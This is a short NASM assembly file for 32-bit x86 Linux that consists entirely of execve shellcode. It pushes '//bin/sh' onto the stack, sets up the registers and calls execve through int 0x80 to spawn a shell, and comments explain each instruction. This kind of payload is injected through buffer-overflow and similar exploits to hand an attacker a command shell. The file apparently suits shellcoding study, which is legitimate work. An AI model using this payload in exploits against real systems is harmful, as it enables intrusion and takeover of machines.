global _start

section .text
_start:

	xor eax, eax 		; ZERO OUT EAX REGISTER
	push eax 		; PUSH TO STACK

				; PUSH //BIN/SH (8 BYTES) IN REVERSE
	push 0x68732f6e
	push 0x69622f2f
				
	mov ebx, esp		; POINT EBX TO //BIN/SH
				; PUSH EAX (0x00000000) TO EDX
	push eax		
	mov edx, esp
				; PUSH //BIN/SH TO STACK, POINT ECX TO IT
	push ebx
	mov ecx, esp

	mov al, 11
	int 0x80
